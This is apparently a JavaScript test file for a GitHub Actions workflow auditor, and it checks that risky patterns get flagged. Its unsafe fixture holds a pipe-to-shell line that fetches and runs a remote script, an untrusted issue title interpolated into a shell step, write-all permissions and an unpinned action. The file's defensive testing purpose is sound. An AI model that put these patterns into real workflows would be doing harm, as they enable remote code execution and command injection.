import test from 'node:test';
import assert from 'node:assert/strict';
import { inspectWorkflow } from '../src/audit.js';

test('detects dangerous workflow permission and execution patterns', () => {
  const source = `
name: unsafe
on: pull_request_target
permissions: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: vendor/action@main
      - run: curl https://example.invalid/install | sh
      - run: echo \${{ github.event.issue.title }}
`;
  const findings = inspectWorkflow(source, 'unsafe.yml');
  const keys = findings.map((item) => item.key);
  assert.equal(keys.includes('permissions-write-all'), true);
  assert.equal(keys.includes('pull-request-target'), true);
  assert.equal(keys.includes('pipe-shell'), true);
  assert.equal(keys.some((key) => key.startsWith('unpinned-actions:')), true);
  assert.equal(keys.includes('untrusted-context-shell'), true);
});

test('accepts a tightly scoped workflow with commit-pinned actions', () => {
  const source = `permissions:\n  contents: read\nsteps:\n  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683`;
  assert.deepEqual(inspectWorkflow(source, 'safe.yml'), []);
});
